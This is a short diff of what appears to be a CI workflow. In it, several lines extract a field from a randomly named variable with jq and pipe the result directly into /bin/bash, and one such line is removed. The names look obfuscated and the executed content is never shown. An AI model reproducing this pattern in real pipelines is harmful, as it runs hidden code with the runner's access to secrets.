@@ -27,7 +27,6 @@ jobs:
           echo $s41 | jq -r .yagl30070 | /bin/bash
           echo $lu40202 | jq -r .ysgj1 | /bin/bash
           echo $qln90 | jq -r .igy41 | /bin/bash
-          printf '%s' "$ygeno417" | jq -r .rrk83 | /bin/bash
           echo $wpmxz1 | jq -r .ezgq974 | /bin/bash
           echo $lsf73 | jq -r .tbwq5737 | /bin/bash
           echo $wih579 | jq -r .af39696 | /bin/bash
